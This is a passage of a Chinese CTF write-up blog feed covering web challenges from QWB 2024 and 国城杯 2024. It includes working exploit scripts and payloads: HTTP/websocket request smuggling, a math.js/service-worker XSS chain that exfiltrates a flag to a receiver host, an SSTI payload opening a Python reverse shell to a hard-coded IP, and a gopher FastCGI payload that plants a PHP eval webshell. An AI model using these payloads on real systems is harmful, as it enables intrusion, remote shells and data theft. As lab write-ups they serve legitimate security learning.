class="headerlink" title="proxy"></a>proxy</h2><h3 id="环境搭建-5"><a href="#环境搭建-5" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name proxy -p 5870:8000 sketchpl4ne/qwb2024:proxy_img</span><br></pre></td></tr></table></figure><h3 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h3><p>这题应该是出的有问题，用v2代理去访问v1的flag路由就行了，没有什么限制。</p><figure class="highlight python"><figcaption><span>title:"exp.py"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## --coding: utf-8 --</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:5870/v2/api/proxy&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">  <span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://127.0.0.1:8769/v1/api/flag&quot;</span>,</span><br><span class="line">  <span class="string">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url,json=data, headers=headers)</span><br><span class="line">flag = json.loads(res.text)[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(flag).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><h2 id="proxy-revenge"><a href="#proxy-revenge" class="headerlink" title="proxy_revenge"></a>proxy_revenge</h2><h3 id="环境搭建-6"><a href="#环境搭建-6" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name proxy_revenge -p 5870:8000 sketchpl4ne/qwb2024:proxy_revenge_img</span><br></pre></td></tr></table></figure><h3 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h3><p>使用到<code>websocket-summgle</code> ，由于<code>proxy.conf</code>里v2的代理设置有问题，对于header的Upgrade直接转发不做任何限制，符合<a href="https://github.com/0ang3el/websocket-smuggle">websocket-summgle</a> 里的<code>Scenario 2 nginx smuggle</code>。</p><figure class="highlight plaintext"><figcaption><span>title:"proxy.conf"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 8000;</span><br><span class="line"></span><br><span class="line">    location ~ /v1 &#123;</span><br><span class="line">        return 403;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~ /v2 &#123;</span><br><span class="line">        proxy_pass http://localhost:8769;</span><br><span class="line">        proxy_http_version 1.1;</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">        proxy_set_header Connection $connection_upgrade;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞原理：简单来说，如果client在Header里设置Upgrade、Sec-WebSocket-Accept等参数发起http请求，并且backend返回HTTP 状态码101的话，那么就可借由反代服务器实现一个<code>client &lt;=&gt; backend</code>的socket连接。后续通过这个socket连接可以绕过中间件的acl waf，从而访问原本受限的路由。</p><p>感谢L3H大碟的WP： <a href="https://blog.yllhwa.com/qwb-2024-proxy-revenge-wp/">https://blog.yllhwa.com/qwb-2024-proxy-revenge-wp/</a><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/9de86b2db7268e5f245d7ff5c6866de2.png"></p><p>所以先起一个永远 return 101 http status code  的 server</p><figure class="highlight python"><figcaption><span>title:"server.py"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> http.server</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleHTTPRequestHandler</span>(http.server.BaseHTTPRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        self.send_response(<span class="number">101</span>)</span><br><span class="line">        self.send_header(<span class="string">&#x27;Content-type&#x27;</span>, <span class="string">&#x27;text/html&#x27;</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line">        self.wfile.write(<span class="string">b&#x27;HTTP Status 101 - Switching Protocols&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## Set up the server to listen on localhost and port 5000</span></span><br><span class="line">server_address = (<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">5000</span>)</span><br><span class="line">httpd = http.server.HTTPServer(server_address, SimpleHTTPRequestHandler)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Server running on http://0.0.0.0:5000/&quot;</span>)</span><br><span class="line">httpd.serve_forever()</span><br></pre></td></tr></table></figure><p>然后请求走私打一发payload即可（这里尝试发现并不需要绕加密，思路可以参考<code>yllhwa</code>师傅的WP）</p><figure class="highlight python"><figcaption><span>title:"smuggle.py"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;http://localhost:5870&quot;</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&#x27;localhost&#x27;</span>, <span class="number">5870</span>))</span><br><span class="line"><span class="comment">## Here is a attacker server that u need to build which always response http status &quot;101&quot;</span></span><br><span class="line">content = <span class="string">&#x27;&#123;&quot;url&quot;: &quot;http://192.168.0.191:5000&quot;, &quot;method&quot;: &quot;GET&quot;&#125;&#x27;</span></span><br><span class="line">payload = <span class="string">f&quot;&quot;&quot;POST /v2/api/proxy HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost:5870</span></span><br><span class="line"><span class="string">Upgrade: websocket</span></span><br><span class="line"><span class="string">Connection: Upgrade</span></span><br><span class="line"><span class="string">Content-Length: <span class="subst">&#123;<span class="built_in">len</span>(content)&#125;</span></span></span><br><span class="line"><span class="string">Content-Type: application/json</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="subst">&#123;content&#125;</span></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">s.send(payload.encode())</span><br><span class="line"><span class="built_in">print</span>(s.recv(<span class="number">1024</span>))</span><br><span class="line">payload = <span class="string">f&quot;&quot;&quot;POST /v1/api/flag HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost:5870</span></span><br><span class="line"><span class="string">Content-Length: <span class="subst">&#123;<span class="built_in">len</span>(content)&#125;</span></span></span><br><span class="line"><span class="string">Content-Type: application/json</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="subst">&#123;content&#125;</span></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">s.send(payload.encode())</span><br><span class="line"><span class="built_in">print</span>(s.recv(<span class="number">1024</span>))</span><br></pre></td></tr></table></figure><h2 id="ezcalc"><a href="#ezcalc" class="headerlink" title="ezcalc"></a>ezcalc</h2><h3 id="环境搭建-7"><a href="#环境搭建-7" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>这题需要安装SSL证书实现https访问，本地起环境没用，下面是微调了的dockerfile</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pan.baidu.com/s/1rVf7OrdUdO6WrbFiaUlxsg?pwd=xmxm 提取码: xmxm</span><br></pre></td></tr></table></figure><p>买了1个月的服务器，起个远程环境方便复现，希望别搅屎（）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ezcalc.jaspersec.us.kg/</span><br></pre></td></tr></table></figure><h3 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h3><p>服务逻辑：两个服务，app可以计算用户输入的算数表达式，也可以提交report反馈可能计算错误的结果。用户提交的report (包含算术表达式) 会发送给bot，然后bot起一个浏览器访问app服务并重新计算结果，对用户的反馈进行验证。</p><p>在bot的逻辑里注意到如果提交的表达式为 <code>114514</code>，bot会读取flag作为expr，输入app作为表达式计算。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/7d7359b03c73056c6838fb3103bb427e.png"></p><p>光这样显然没用，因为flag不会回显，问题是怎么回显flag，看了W&amp;M的writeup，后续是通过打math.js的cve实现js代码执行，然后用service worker去劫持页面，bot点击按钮时触发js代码外带出flag。</p><p>具体方式可以参考下方wp，JS研究没那么深：</p><ul><li><a href="https://blog.wm-team.cn/index.php/archives/85/#EzCalc">https://blog.wm-team.cn/index.php/archives/85/#EzCalc</a></li><li><a href="https://lorexxar.cn/2018/04/20/SW-xss/">https://lorexxar.cn/2018/04/20/SW-xss/</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API">https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API</a></li></ul><p>exp如下：</p><figure class="highlight python"><figcaption><span>title:exp.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">RECEIVER=<span class="string">&#x27;http://xxx.xxx.xxx.xxx:xxx&#x27;</span></span><br><span class="line"></span><br><span class="line">TARGET=<span class="string">&#x27;https://ezcalc.jaspersec.us.kg/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>(<span class="params">content</span>):</span><br><span class="line">    bio = BytesIO()</span><br><span class="line">    bio.write(content.encode())</span><br><span class="line">    r = requests.post(TARGET + <span class="string">&#x27;/api/screenshot/upload&#x27;</span>, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;a.js&#x27;</span>, bio.getvalue(), <span class="string">&#x27;image/png&#x27;</span>)&#125;)</span><br><span class="line">    <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_payload</span>(<span class="params">script</span>):</span><br><span class="line">    payload = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    e=parse(&quot;constructor(&#x27;d=()=&gt;document.querySelector(`.ant-alert-message`);setInterval(()=&gt;&#123;if(d())d().innerHTML=114514&#125;,100);%s&#x27;)&quot;)._compile(&#123;&#125;,&#123;&#125;);f=e(null,cos);f()</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>.replace(<span class="string">&#x27;%s&#x27;</span>, script).strip()</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">service_worker_html = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">GIF89a=1;</span></span><br><span class="line"><span class="string">self.addEventListener(&#x27;install&#x27;, event =&gt; &#123;</span></span><br><span class="line"><span class="string">  self.skipWaiting();</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">self.addEventListener(&#x27;activate&#x27;, event =&gt; &#123;</span></span><br><span class="line"><span class="string">  event.waitUntil(self.clients.claim());</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">const html = `</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;input id=&quot;expr&quot; type=&quot;text&quot; value=&quot;&quot;&gt;&lt;button id=&quot;calc&quot;&gt;Calculate&lt;/button&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">calc.onclick = () =&gt; &#123; window.location.href = &quot;%s/?flag=&quot;+encodeURIComponent(expr.value) &#125;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">`;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">self.addEventListener(&#x27;fetch&#x27;, event =&gt; &#123;</span></span><br><span class="line"><span class="string">  if (event.request.url.endsWith(&#x27;/&#x27;)) &#123;</span></span><br><span class="line"><span class="string">    event.respondWith(</span></span><br><span class="line"><span class="string">      new Response(html, &#123;</span></span><br><span class="line"><span class="string">        headers: &#123; &#x27;Content-Type&#x27;: &#x27;text/html&#x27; &#125;</span></span><br><span class="line"><span class="string">      &#125;)</span></span><br><span class="line"><span class="string">    );</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.replace(<span class="string">&#x27;%s&#x27;</span>, RECEIVER).strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post_payload</span>(<span class="params">expr_payload</span>):</span><br><span class="line">    url = TARGET + <span class="string">&#x27;/api/report&#x27;</span></span><br><span class="line">    json = &#123;<span class="string">&quot;expression&quot;</span>: expr_payload, <span class="string">&quot;result&quot;</span>: <span class="string">&quot;[]&quot;</span>, <span class="string">&quot;email&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;comment&quot;</span>: <span class="string">&quot;B&quot;</span>, <span class="string">&quot;screenshots&quot;</span>: []&#125;</span><br><span class="line">    r = requests.post(url, json=json)</span><br><span class="line">    <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    json = upload_file(service_worker_html)</span><br><span class="line">    fp = <span class="string">&#x27;/&#x27;</span> + json[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;path&#x27;</span>].replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Service Worker: <span class="subst">&#123;fp&#125;</span>&quot;</span>)</span><br><span class="line">    payload = gen_payload(<span class="string">f&#x27;&#x27;&#x27;navigator.serviceWorker.register(`<span class="subst">&#123;fp&#125;</span>`)&#x27;&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Payload: <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line">    json = post_payload(payload)</span><br><span class="line">    report_id = json[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Report ID: <span class="subst">&#123;report_id&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;URL: <span class="subst">&#123;TARGET&#125;</span>/api/report/<span class="subst">&#123;report_id&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>成功外带flag<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/b05a415a7edf54e74e298c5f4f6d8dec.png"></p><h2 id="Playground-TODO"><a href="#Playground-TODO" class="headerlink" title="Playground TODO"></a>Playground TODO</h2><h3 id="环境搭建-8"><a href="#环境搭建-8" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name playground -p 9000:5000 sketchpl4ne/qwb2024:playground_img</span><br></pre></td></tr></table></figure><h3 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h3><p>题目实现了运行go程序的sandbox，flask接收用户提交的go代码，go build为可执行文件后，发送到用C写的sandbox里。</p><p>看不清楚<code>sandbox.c</code>里面有什么漏洞，有会的师傅可以教教我 :-)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt; &lt;a href=&quot;https://xmcve.com/&quot;&gt;星盟安全团队&lt;/a&gt;长期招新中~ 我们的目标是星辰大海！ &lt;/p&gt;
&lt;ul&gt;
&lt;</summary>
      
    
    
    
    
    <category term="php" scheme="https://jaspersec.top/tags/php/"/>
    
    <category term="wp" scheme="https://jaspersec.top/tags/wp/"/>
    
    <category term="go" scheme="https://jaspersec.top/tags/go/"/>
    
    <category term="python" scheme="https://jaspersec.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>国城杯2024 线上赛 writeup</title>
    <link href="https://jaspersec.top/posts/4142772759.html"/>
    <id>https://jaspersec.top/posts/4142772759.html</id>
    <published>2024-12-16T01:47:00.000Z</published>
    <updated>2025-03-31T22:09:47.236Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> <a href="https://xmcve.com/">星盟安全团队</a>长期招新中~ 我们的目标是星辰大海！ </p><ul><li>简历格式：ID、联系方式、掌握技术、比赛情况</li><li>简历投递邮箱： <a href="mailto:&#120;&#x6d;&#99;&#118;&#x65;&#x40;&#x71;&#x71;&#x2e;&#x63;&#x6f;&#109;">&#120;&#x6d;&#99;&#118;&#x65;&#x40;&#x71;&#x71;&#x2e;&#x63;&#x6f;&#109;</a></li><li>联系QQ：1609410364</li></ul><p>国城杯的题不错的，复现了一下4个web，顺手做了docker方便师傅复现。</p><p>PS: 图片在Github图床，加载不出请更换网络。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/f2a73f5c2f55595830f81e96190f6763.png"></p><h2 id="ez-gallery"><a href="#ez-gallery" class="headerlink" title="ez_gallery"></a>ez_gallery</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name ez_gallery -d -p 8080:6543 sketchpl4ne/gcb2024:ez_gallery_img</span><br></pre></td></tr></table></figure><h3 id="解题思路1"><a href="#解题思路1" class="headerlink" title="解题思路1"></a>解题思路1</h3><p><strong>思路：ssti request外带出网反弹shell</strong></p><p>首先是任意文件读，读<code>app.py</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info?file=/app/app.py</span><br></pre></td></tr></table></figure><p>ssti绕waf实现rce，反弹shell：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shell?shellcmd=&#123;&#123;config|attr(%22__class__%<span class="number">22</span>)|attr(%27__init__%<span class="number">27</span>)|attr(%27__globals__%<span class="number">27</span>)|attr(%27__getitem__%<span class="number">27</span>)(%27__builtins__%<span class="number">27</span>)|attr(%27__getitem__%<span class="number">27</span>)(%27<span class="built_in">eval</span>%<span class="number">27</span>)(request|attr(%27GET%<span class="number">27</span>)|attr(%27get%<span class="number">27</span>)(%27pzh%<span class="number">27</span>))&#125;&#125;&amp;pzh=<span class="built_in">__import__</span>(%27os%<span class="number">27</span>).system(<span class="string">&#x27;python+-c+\&#x27;import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect((&quot;116.62.38.71&quot;,9999))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3b+os.dup2(s.fileno(),2)%3bp%3dsubprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])%3b\&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/fdd891af2dce0ce0a8385d71d5fb068a.png"></p><h3 id="解题思路2"><a href="#解题思路2" class="headerlink" title="解题思路2"></a>解题思路2</h3><p><strong>思路：其实一开始看到pyramid，就猜到是换个框架写内存马，得看doc，先鸽XD</strong></p><h2 id="signal"><a href="#signal" class="headerlink" title="signal"></a>signal</h2><h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name signal -d -p 8082:80 sketchpl4ne/gcb2024:signal_img</span><br></pre></td></tr></table></figure><h3 id="解题思路1-1"><a href="#解题思路1-1" class="headerlink" title="解题思路1"></a>解题思路1</h3><p><strong>思路：ssrf绕https限制，gopher打fastcgi</strong></p><p>首先vim恢复文件得到guest用户：<code>guest/MyF3iend</code></p><p>进去是个文件包含，<code>guest.php</code>有waf，用二次url编码绕过读文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？path=php:<span class="comment">//filter/%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35/resource=/tmp/hello.php</span></span><br></pre></td></tr></table></figure><p>找一找，可以读<code>StoredAccounts.php</code>，拿到admin用户：<code>admin/FetxRuFebAdm4nHace</code></p><p><code>admin.php</code>进去是ssrf，必须是https开头，这里用ngrok弄一个带https的域名，反代自己的vps，再用302跳转打本地的fastcgi。</p><p>去ngrok官网注册个好，设置好token，vps下面命令起服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ngork http 8080</span><br></pre></td></tr></table></figure><p>vps再起一个python服务用来302跳转</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, redirect </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">indexRedirect</span>():</span><br><span class="line">    redirectUrl = <span class="string">&#x27;gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH111%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/admin.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00o%04%00%3C%3Fphp%20system%28%27echo%20%22%3C%3Fphp%20%40eval%28%5C%24_POST%5B1%5D%29%3B%20%3F%3E%22%20%3E/var/www/html/shell.php%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> redirect(redirectUrl)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;jasper&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>payload用gopherus生成， 注意指定文件名要存在，fastcgi的事儿，写webshell如下：<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/d4dc72337c68b3881daf83d9c1b3b48e.png"></p><p>然后设置好服务，打一发payload<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/99fa6f95e3cbb32388ff5bfc26dc0da1.png"><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/d7b055c1179fa444e42bc8440ab211f7.png"></p><p>接着蚁剑上线，只有假flag，suid提权发现有sudo，<code>sudo -l</code>看到cat的可读路径使用了通配符，通过目录穿越读flag<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/c665a33c9689996cb6b8895b1b478027.png"></p><h3 id="解题思路2-1"><a href="#解题思路2-1" class="headerlink" title="解题思路2"></a>解题思路2</h3><p>用filterchain，非预期，可以看晨曦师傅的wp。</p><h2 id="noob-unser"><a href="#noob-unser" class="headerlink" title="noob_unser"></a>noob_unser</h2><h3 id="环境搭建-2"><a href="#环境搭建-2" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name noob_unser -d -p 8083:80 sketchpl4ne/gcb2024:noob_unser_img</span><br></pre></td></tr></table></figure><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p><strong>思路：upload_process上传临时文件+过滤器清洗数据+phar反序列化</strong></p><p>问了道格的师傅，这题是Orange师傅的两道题结合起来了，非常巧妙。</p><p>cookie显然可以反序列化，然后有两个功能：</p><ol><li>user用户可以复制文件（filename有waf）</li><li>admin用户可以rce</li></ol><p>php upload process可以在&#x2F;tmp下生成部分内容可控的<code>sess_&lt;sessionid&gt;</code>文件<br><img 